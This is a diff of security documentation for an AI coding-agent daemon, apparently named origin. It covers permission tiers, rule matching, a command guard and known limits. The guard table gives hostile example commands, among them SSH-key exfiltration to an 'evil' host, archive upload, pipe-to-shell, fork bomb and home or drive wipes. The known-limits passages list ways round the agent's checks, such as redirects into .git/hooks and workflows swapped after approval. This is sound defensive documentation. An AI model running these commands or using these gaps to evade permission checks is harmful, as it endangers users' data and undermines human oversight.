@@ -145,15 +145,20 @@ daemon's permission mode (see [Permission modes](#permission-modes-workspace--on
 
 | Tier | Meaning | Triggers a prompt? | Example tools (file) |
 | ---- | ------- | ------------------ | -------------------- |
-| `AutoAllowed` | Read-only / pure / non-exfiltrating; safe to run without asking. | No — bypasses the `Prompter`. | `read` (`builtins/read.rs`), `glob_tool`, `grep_tool`, `diagnostics`, `lsp_nav`, `monitor`, `mem` *(search)*, `tool_search`, `ask`, `ask_user`, `graph_query`/`graph_explain`/`graph_path`/`graph_summarize`, `recall`, `CollectTasks` |
-| `RequiresPermission` | Mutating, network-reaching, or privacy-sensitive; needs explicit human approval. | Depends on the permission mode (see below). | `bash` (`builtins/bash.rs`), `edit`, `multi_edit`, `write`, `apply_patch`, `web_fetch`, `web_search`, `browser`, `gmail`, `graph_rebuild`, `author_workflow`, `run_workflow`, `task`, `mem` *(save/forget)* |
+| `AutoAllowed` | Read-only / pure / non-exfiltrating; safe to run without asking. | No — bypasses the `Prompter`. | `read` (`builtins/read.rs`), `glob_tool`, `grep_tool`, `monitor`, `mem` *(search)*, `tool_search`, `ask`, `ask_user`, `graph_query`/`graph_explain`/`graph_path`/`graph_summarize`, `recall`, `CollectTasks` |
+| `RequiresPermission` | Mutating, network-reaching, privacy-sensitive, or runs project code; needs explicit human approval. | Depends on the permission mode (see below). | `bash` (`builtins/bash.rs`), `edit`, `multi_edit`, `write`, `apply_patch`, `web_fetch`, `web_search`, `browser`, `gmail`, `graph_rebuild`, `author_workflow`, `run_workflow`, `task`, `mem` *(save/forget)*, `diagnostics`, `lsp_nav` |
 
 > Tiers are assigned per builtin in `crates/origin-tools/src/builtins/*.rs`
 > (grep `tier:` confirms each). `task` (spawning a swarm worker) is
 > `RequiresPermission` (A4): its permission preview starts with
 > `<G>/<T> gated tools, <D> mcp servers`, the number of permission-gated tools
 > and MCP servers the worker would be granted. `gmail` is `RequiresPermission`
-> because it reads private mail.
+> because it reads private mail. `diagnostics` and `lsp_nav` (`Diagnostics`,
+> `LspNavigate`) are `RequiresPermission` because starting a language server
+> runs project code: rust-analyzer runs `cargo metadata`, build scripts and
+> proc-macros, with network access. In mode `workspace` that is an ordinary ask
+> "Always allow" can cover; where nobody can answer it is denied; a `Task`
+> that grants either tool is not a read-only delegation.
 
 ### Bloom-prefiltered rules and skill narrowing
 
@@ -165,6 +170,13 @@ Two wrappers extend the base `check`:
   fast negative test: if `bloom.maybe_contains(key)` is false the engine skips
   the rule walk and falls straight through to the tier check. An explicit rule
   short-circuits with `reason = "rule:{tool}@{scope}:allow|deny"`.
+- The daemon's own lookup of `[[permission_rules]]` (`decide_permission` in
+  `crates/origin-daemon/src/agent.rs`) does not use the bloom or the exact key:
+  tool names match in any case (`tool = "bash"` binds `Bash`), and when a deny
+  and an allow rule name the same tool, the deny wins. The only supported
+  `scope` is `"*"`: at start-up a deny rule with another scope is loaded at `*`
+  (it applies everywhere) and an allow rule with another scope is dropped (it is
+  ignored), each with a warning in the daemon log.
 - `check_with_skills(...)` enforces the active skill mask (next section).
 
 ## allowed-tools narrowing via skills
@@ -174,6 +186,13 @@ A *skill* is a markdown document with YAML frontmatter; one of its fields is
 [authoring guide](../guides/authoring-skills.md) for the full lifecycle. From a
 security standpoint, the skill's `allowed-tools` list is a **capability mask**:
 activating a skill can only ever *shrink* the set of tools the agent may call.
+One exception: in `RunWorkflow`, a step's skill `allowed-tools` (or, when the
+skill declares none or is missing, the default `Read, Grep, Glob, Edit, Write`)
+is what that step's worker is **granted**. The `RunWorkflow` ask therefore starts
+with the total reach of all its steps (`<G>/<T> gated tools, <D> mcp servers`,
+then the workflow name, or `(workflow not found)`), and `AuthorWorkflow`, which
+writes the workflows file that later grants tools (and can replace a workflow of
+the same name), is asked every time without an "Always allow" offer.
 
 The frontmatter shape (`crates/origin-skills/src/frontmatter.rs`):
 
@@ -206,7 +225,8 @@ Two design rules make this safe:
   the intersection to the empty (deny-all) set. Only skills with a non-empty
   list contribute.
 - **Multiple active skills intersect.** Stacking skills can only ever make the
-  reachable set *smaller* — never larger. There is no union path.
+  reachable set *smaller* — never larger. There is no union path for an active
+  skill mask (a `RunWorkflow` step's grant, above, is not a mask).
 
 ### Enforcement point
 
@@ -293,7 +313,11 @@ Known limits (accepted, reported): the four-word window means
 option value in first position is read as the program (`sudo -u $USER ls`
 needs approval); bash's single-dash long options (`bash -norc < evil.sh`,
 `bash -rcfile /dev/stdin -i foo < evil.sh`) are rated `Safe`; PowerShell
-`Start-Process` is not followed.
+`Start-Process` and `[System.Diagnostics.Process]::Start` are not followed; code
+passed to an interpreter is not analysed (`python -c "$(curl …)"`, `node -e …`);
+redirect targets are not inspected (`echo … > .git/hooks/pre-commit` is `Safe`);
+`rm -rf C:` in a POSIX shell is refused although there it names a directory
+called `C:` (fail-closed false positive).
 
 ### Bypass classes it defends against
 
@@ -301,13 +325,13 @@ needs approval); bash's single-dash long options (`bash -norc < evil.sh`,
 | -------- | ---------------------- | ------- | -------------- |
 | `cd` check (in `check_cmd`) | `cd` into a forbidden directory *before* an "approved" command, escaping a path-scoped allowlist. | `Suspicious` | `cd /etc && cat shadow` |
 | bare-assignment check (in `check_cmd`) | A leading `NAME=val` makes the *real* command the second word, dodging a first-word allowlist. | `Suspicious` | `FOO=bar evilcmd --do-it` |
-| program unknown statically (in `check_cmd`) | A variable, substitution or glob in command position, `eval`/`iex`, `-EncodedCommand`, input piped into a shell, or a line that cannot be parsed. | `NeedsApproval` | `eval "$CMD"` |
+| program unknown statically (in `check_cmd`) | A variable, substitution or glob in command position, `eval`/`iex`, `-EncodedCommand`, input piped into a shell, a shell or `source`/`.` run on a process substitution, `env -S`/`--split-string`, or a line that cannot be parsed. | `NeedsApproval` | `eval "$CMD"`, `bash <(curl …)`, `env -S 'rm -rf ~'` |
 | `detect_install` (C6, with `dep_gate`) | Installing or running a package the project does not declare. See [Dependency-install gate](#dependency-install-gate-c6). | `NeedsApproval` | `npm install left-pad` (undeclared) |
-| `detect_rm_rf_home` | `rm -rf` (any flag order/grouping, long forms, `--no-preserve-root`) aimed at `~`, `$HOME`, `${HOME}`, `/`, or a `$HOME`/`~` with trailing slash — even behind `sudo`/`/bin/rm`/`\rm`/env prefix. | `Dangerous` | `sudo rm -rf ~`, `rm --recursive --force /`, `\rm -rf $HOME/` |
-| `detect_pipe_to_shell` | Remote content fetched and piped straight into an interpreter (`sh`/`bash`/`zsh`/`dash`/`python`/`perl`/`ruby`/`node`). | `Dangerous` | `curl https://x/install.sh \| sh` |
+| `detect_rm_rf_home` | `rm -rf` (any flag order/grouping, long forms, `--no-preserve-root`) aimed at `~`, `$HOME`, `${HOME}`, `/`, a `$HOME`/`~` with trailing slash, every entry of one (`~/*`, `/*`, `~/.`, `~/.*`, `$HOME/*`), or a Windows drive root (`C:`, `C:\`, `C:/`, `C:\*`, also via `Remove-Item`, `rd`, `rmdir`) — even behind `sudo`/`/bin/rm`/`\rm`/env prefix. | `Dangerous` | `sudo rm -rf ~`, `rm --recursive --force /`, `rm -rf ~/*`, `Remove-Item -Recurse -Force C:\` |
+| `detect_pipe_to_shell` | Remote content fetched and piped straight into an interpreter (`sh`/`bash`/`zsh`/`dash`/`python`/`perl`/`ruby`/`node`), also into a grouped shell. | `Dangerous` | `curl https://x/install.sh \| sh`, `curl … \| (sh)`, `curl … \| { sh; }` |
 | `detect_base64_to_shell` | Obfuscated payload decoded and executed. | `Dangerous` | `echo … \| base64 -d \| sh` |
 | `detect_archive_exfil` | Broad directory archived and piped to a network command (`curl`/`wget`/`nc`/`netcat`/`ncat`/`ssh`) — bulk exfiltration. | `Dangerous` | `tar czf - ~ \| curl -T - http://evil/upload` |
-| `detect_secret_then_network` | A credential file (`.ssh`, `id_rsa`, `.env`, `credentials`, `.aws`, `.netrc`) read on the same line as `curl`/`wget`. | `Dangerous` | `cat ~/.ssh/id_rsa \| curl -X POST --data-binary @- http://evil` |
+| `detect_secret_then_network` | A credential file (`.ssh`, `id_rsa`, `.env`, `credentials`, `.aws`, `.netrc`) read on the same line as `curl`/`wget`/`nc`/`ncat`/`scp`/`Invoke-WebRequest` (`iwr`)/`Invoke-RestMethod` (`irm`). | `Dangerous` | `cat ~/.ssh/id_rsa \| curl -X POST --data-binary @- http://evil` |
 | `detect_fork_bomb` | The classic `:(){ :\|:& };:` fork bomb, tolerant of internal spacing. | `Dangerous` | `:(){ :\|:& };:` |
 
 Every row above is backed by a unit test in the same file's `#[cfg(test)]`
@@ -332,7 +356,8 @@ command that installs or runs a package the project does not declare gets
   another index or registry (`--index-url`, `--extra-index-url`, `--find-links`,
   `--registry`, glued `-i…`/`-f…`, bare `yarn --registry`, or
   `PIP_INDEX_URL`/`PIP_EXTRA_INDEX_URL`/`PIP_FIND_LINKS`/`npm_config_registry`/`UV_INDEX_URL`/`UV_EXTRA_INDEX_URL`/`UV_INDEX`/`YARN_NPM_REGISTRY_SERVER`/`YARN_REGISTRY`/`GOPROXY`
-  set on the command, also for `npm ci`, and `npm cit`/`npm update`/`npm up`
+  set on the command or passed through the `Bash` tool's `env` argument, also
+  for `npm ci`, and `npm cit`/`npm install-ci-test`/`npm update`/`npm up`
   with `--registry`); packages supplied at run time (`xargs`, `pip install -r` of
   a URL/stdin/substitution). For named packages: global installs (`-g`,
   `--location=global`, `uv pip install --system`, `yarn global add`,
@@ -412,6 +437,11 @@ registry URLs such as `GOPROXY`, `PIP_INDEX_URL`, `NPM_CONFIG_REGISTRY`,
 `UV_INDEX_URL`, kept off the default list because they can embed
 `user:token@` credentials); `ORIGIN_ENV_SCRUB=0` restores full inheritance. See
 [environment variables](../reference/environment-variables.md#security-permissions--child-processes).
+Not covered: the self-development `cargo build` / `cargo test` (`ORIGIN_SELFDEV`,
+`crates/origin-selfdev/src/cargo.rs`) is not scrubbed and sees the daemon's full
+environment, provider keys included. The post-edit syntax checkers (`python`,
+`node --check`) run from the system temp directory on an absolute file path,
+Python as `python -I -m py_compile`.
 
 Why the backends are not enabled (inventory at the time of writing; Linux and
 macOS behaviour was read from code, not run):
@@ -535,8 +565,13 @@ credentials read at startup are replaced by `[REDACTED:<NAME>]` in tool output
 (sub-agent inline-MCP results included), turn-end gate output (including what
 the goal verifier sees), recalled memory and the repo-map focus block added to a
 prompt, and persisted sessions, and the file-writing tools refuse to write such a marker back to
-disk. It is **best-effort**: keys added or rotated after startup, other
-accounts' secrets, and multi-line, escaped or truncated secrets are not caught.
+disk. It is **best-effort**: the set of values is collected once, when the
+daemon starts, for the account in use then (`OnceLock` in
+`crates/origin-daemon/src/redact.rs`), so keys added or rotated later, an OAuth
+access token refreshed later and other accounts' keys are not redacted until the
+daemon restarts; multi-line, escaped or truncated secrets are not caught. Daemon
+log lines and the opt-in OpenTelemetry content capture
+(`ORIGIN_OTEL_CAPTURE_CONTENT=1`) are not redacted.
 The session DB is created `0600` on Unix; this does **not** make the whole
 session store user-only (on Unix the content store and resume directory live
 under the system temp directory with default permissions). Opt-in
@@ -568,15 +603,27 @@ from a daemon it spawns; a daemon's own `ORIGIN_ALLOW_ALL=1` applies to
 non-interactive requests only (logged once). An interactive `/goal` loop left
 unattended **blocks on the first ask** (the IPC prompter has no timeout).
 
-**Protected paths.** Inside a workspace root, edits to any `.git` or `.origin`
-path component, Origin's governance directory and `ORIGIN_HOME` ask every time
-("person" below), and a root that is, or contains, the home directory, or is a
-drive/filesystem root (or when the home directory is unknown), auto-allows no
-edit. This is the stated minimum: other files that run on next use (CI
-workflows, `package.json` scripts, Makefiles, build scripts) are ordinary
-project code and are edited without asking, and opt-in features that run code
-after an edit (autoformat, `auto_test`, LSP build scripts) turn such an edit
-into code execution.
+**Protected paths.** Inside a workspace root, edits by the file tools (`Write`,
+`Edit`, `MultiEdit`, `ApplyPatch`, and a `Browser` screenshot `path`) to any
+`.git` or `.origin` path component, Origin's governance directory and
+`ORIGIN_HOME` ask every time ("person" below), and a root that is, or contains,
+the home directory, or is a drive/filesystem root (or when the home directory is
+unknown), auto-allows no such edit. This covers the file tools only: a Bash
+command can write anywhere the user can (there is no OS sandbox), and under a
+standing "Always allow Bash" a redirect or `tee` into `.git/hooks` or `~/.ssh`
+runs without a further ask, because the command guard does not inspect redirect
+targets. This is the stated minimum: other files that run on next use (CI
+workflows, `package.json` scripts, Makefiles, build scripts,
+`.pre-commit-config.yaml`, `.npmrc`, `.yarnrc.yml`, `.cargo/config.toml`,
+`rust-toolchain.toml`, `.devcontainer/devcontainer.json`, `.vscode/tasks.json`,
+`.hg/hgrc`, `justfile` / `Taskfile.yml`) are ordinary project code and are
+edited without asking. Code also runs after an edit: by default, after a turn
+that edits a file, origin may run the language's own syntax checker on it
+(`python -I -m py_compile`, `node --check`; `ORIGIN_EDIT_CHECK=0` turns it off),
+in isolated mode, from the system temp directory, on an absolute path, so it does
+not import or load configuration from the workspace; and opt-in features
+(autoformat, `auto_test`, LSP build scripts) turn such an edit into code
+execution.
 
 **Explicit deny rules win.** A `[[permission_rules]]` deny rule for a tool binds
 every context, including auto-allowed tools and the allow-all flag.
@@ -594,8 +641,11 @@ prose edits bypassed every permission check.
 
 **Session-scoped "Always allow".** An "Always allow <tool>" answer lasts for the
 session, in memory only (lost when the daemon restarts). It is never offered or
-honoured for `Task`, `RunWorkflow`, person-asks (outside/protected/home-root
-writes; network tools and Bash after taint), or guard-flagged commands.
+honoured for `Task`, `RunWorkflow`, `AuthorWorkflow`, person-asks
+(outside/protected/home-root writes by the file tools, a `Browser` screenshot
+`path` there; network tools and Bash after taint), or guard-flagged commands.
+It does cover a later Bash command that writes to those places (see Protected
+paths).
 
 **Session taint.** Once a successful result from `WebFetch`, `WebSearch`,
 `Browser`, `gmail` or any `mcp__*` tool — or a sub-agent result that contained
@@ -631,9 +681,11 @@ allow rules are not inherited), except a `NeedsApproval` command.
 | `NeedsApproval` command | person (one ask, guard reason first) | person | deny | allow | deny | deny |
 | `Dangerous` command | deny, no ask | deny | deny | deny | deny | deny |
 | `Task` with grants | person (every delegation) | person | deny | allow | n/a (no coordinator) | n/a |
-| `Task` read-only (`0/<T> gated tools, 0 mcp servers`) | allow | allow | allow | allow | n/a | n/a |
-| `RunWorkflow` | ask (every time, no "Always allow") | ask (every time) | deny | allow | n/a (error: no nested delegation) | n/a |
-| other gated tool (mem_save, graph_rebuild, AuthorWorkflow, …) | ask\* | ask\* | deny | allow | grant | grant |
+| `Task` read-only (`0/<T> gated tools, 0 mcp servers`; granting `Diagnostics`/`LspNavigate` is not read-only) | allow | allow | allow | allow | n/a | n/a |
+| `RunWorkflow` (the prompt starts with its steps' reach, then the workflow name) | ask (every time, no "Always allow") | ask (every time) | deny | allow | n/a (error: no nested delegation) | n/a |
+| `AuthorWorkflow` | ask (every time, no "Always allow") | ask (every time) | deny | allow | grant | grant |
+| `Browser` screenshot `path` outside the workspace or on a protected path | person | person | deny | allow | deny | deny |
+| other gated tool (mem_save, graph_rebuild, `Diagnostics`, `LspNavigate`, …) | ask\* | ask\* | deny | allow | grant | grant |
 
 Best-of-N (`ORIGIN_BESTOFN`) does not start in mode `on`. Its candidates run
 under the session's `[[permission_rules]]` (allow and deny rules, as in the main
@@ -641,8 +693,13 @@ loop), policy layers and conseca. It refuses to apply a winning diff that
 changes a file with uncommitted changes in the working tree. Known limits: any
 client that can reach the daemon socket can send mode `off` (the local IPC
 trust boundary); hard links inside the workspace to files outside it count as
-inside; Unix symlink resolution and a live TUI session were not exercised when
-this was built.
+inside; a Bash command writes wherever the user can, so protected paths and
+"Always allow" limits hold for the file tools only (a redirect or `tee` into
+`.git/hooks` or `~/.ssh` under a standing "Always allow Bash" is not asked
+again); the workflows file is read when the user is asked about a `RunWorkflow`
+and again when it runs, so a workflow replaced in between runs with grants the
+user did not see; Unix symlink resolution and a live TUI session were not
+exercised when this was built.
 
 ## Sub-agents (`Task`)
 
@@ -714,11 +771,18 @@ this was built.
   (B12). Look-alike characters are not neutralised.
 - **Private targets.** `WebFetch` refuses loopback, link-local (including
   169.254.169.254), private, unique-local and unspecified addresses, checked
-  after DNS resolution and on every redirect; system proxies are bypassed while
-  the guard is on. `ORIGIN_WEBFETCH_ALLOW_PRIVATE=1` lifts it (A9).
+  after DNS resolution and on every redirect. `ORIGIN_WEBFETCH_ALLOW_PRIVATE=1`
+  lifts it (A9). While the guard is on, `WebFetch` does not use proxy settings
+  (`no_proxy()` in `crates/origin-browser/src/web_fetch.rs`: a proxy would
+  resolve the target itself, unvetted), so behind a mandatory proxy every
+  `WebFetch` fails; the only remedy is `ORIGIN_WEBFETCH_ALLOW_PRIVATE=1`, which
+  turns the private-address guard off and lets the daemon's `HTTP_PROXY`/
+  `HTTPS_PROXY` apply.
 - **Not covered:** Bash `curl`/`wget` output, files read from disk (including
-  downloaded ones), sub-agent final reports, and memory (`mem_search`) hits
-  reach the model unmarked.
+  downloaded ones), sub-agent final reports, memory (`mem_search`) hits,
+  turn-end gate output (test, lint, edit-check and language-server blocks) and
+  the error text of non-MCP tools reach the model unmarked and do not taint the
+  session.
 
 ## Checkpoints and rewind (C8)
 
@@ -742,6 +806,16 @@ commit-signing config and git hooks.
 ## Dynamic & governance policy (origin-conseca, origin-policy)
 
 Two pure-logic crates bound what the agent may do, at two different timescales.
+
+The daemon reads its governance (policy layers, conseca lists,
+`[[permission_rules]]`, the browser action cap) from `governance.toml`
+(`~/.origin/governance.toml`, or `ORIGIN_GOVERNANCE_PATH`) at start-up. A missing
+file means no governance. A file that exists but cannot be read or parsed stops
+the daemon from starting: the error, naming the file and the parse error, goes to
+`~/.origin/daemon.log` (the CLI points there when the daemon does not come up).
+Known limit: the supervisor keeps restarting the daemon, so a broken file leaves
+it in a restart loop with the same error in the log until the file is fixed or
+removed.
 
 ### origin-conseca — model-generated, per-prompt policy
 
